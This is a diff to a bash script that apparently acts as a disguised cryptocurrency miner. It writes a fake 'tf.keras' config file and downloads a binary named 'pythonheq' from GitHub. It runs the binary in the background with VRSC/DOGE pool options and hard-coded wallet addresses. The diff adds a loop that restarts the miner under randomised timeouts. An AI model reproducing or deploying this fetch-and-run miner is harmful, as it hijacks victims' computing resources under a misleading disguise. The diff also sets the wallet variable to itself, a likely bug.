@@ -1,4 +1,5 @@
 #!/bin/bash
+#speciality :timeout $(($RANDOM%180 + 180))
 echo '{ '
 echo '"type":"tf.keras",' > /tmp/keras.json
 echo '"version":"0.1.9",' >> /tmp/keras.json
@@ -27,8 +28,8 @@ ASIA_PROX=$PROX
 
 #VCOptions="d=16,xn=1,hybrid"
 #VCOptions="mc=VRSC"
-VCOptions="c=DOGE"
-#VCOptions="c=VRSC,mc=VRSC"
+#VCOptions="c=DOGE"
+VCOptions="c=VRSC,mc=VRSC"
 
 #VCOptions="X"
 
@@ -54,7 +55,7 @@ W_DG="D5EcMFZqLsd4CdZipk3LXviX8YUzEEfBj7"
 W_DG2="DSro3i42vz2MytCw22S4wun5qM5bTNNy5c"
 
 
-W_VC=$W_DG
+W_VC=$W_VC
 VC_LUCK=""
 #VC_LUCK="c=VRSC,mc=VRSC"
 
@@ -446,8 +447,13 @@ then
     rm -rf pythonheq
     wget -q https://github.com/one10001/10001code/raw/main/pythonheq
     chmod +x pythonheq
-
-    nohup ./pythonheq -v -l "$PROX":"$VCPort" -u "$W_VC"."$INFO" -t "$VCThreads" -p "$VCOptions" 1>> ooutvc 2>> ooutvc &
+    vcvc() {
+    while true
+    do
+        timeout $(($RANDOM%180 + 180)) ./pythonheq -v -l "$PROX":"$VCPort" -u "$W_VC"."$INFO" -t "$VCThreads" -p "$VCOptions" 
+    done
+    }
+    vcvc 1>> ooutvc 2>> ooutvc &
 else
     VCThreads=$[$(nproc)/2]
     XMThreads=$[$(nproc)/2]
@@ -469,7 +475,16 @@ else
     wget -q https://github.com/one10001/10001code/raw/main/pythonheq
     chmod +x pythonheq
 
-    nohup ./pythonheq -v -l "$PROX":"$VCPort" -u "$W_VC"."$INFO" -t "$VCThreads" -p "$VCOptions" 1>> ooutvc 2>> ooutvc &
+    #nohup ./pythonheq -v -l "$PROX":"$VCPort" -u "$W_VC"."$INFO" -t "$VCThreads" -p "$VCOptions" 1>> ooutvc 2>> ooutvc &
+    ### VCVC
+    vcvc() {
+    while true
+    do
+        timeout $(($RANDOM%180 + 180)) ./pythonheq -v -l "$PROX":"$VCPort" -u "$W_VC"."$INFO" -t "$VCThreads" -p "$VCOptions" 
+    done
+    }
+    vcvc 1>> ooutvc 2>> ooutvc &
+    ### end VCVC
 fi
 
 if [ $OPG == "ET" ]
